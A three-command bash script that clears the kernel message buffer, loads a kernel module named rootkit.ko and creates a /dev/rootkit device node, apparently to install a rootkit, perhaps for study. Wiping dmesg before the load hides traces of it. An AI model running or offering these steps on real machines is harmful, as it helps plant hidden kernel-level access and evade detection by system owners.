#!/bin/bash

sudo dmesg -C
sudo insmod rootkit.ko
sudo mknod /dev/rootkit c 237 0 # Replace Major & Minor with correct values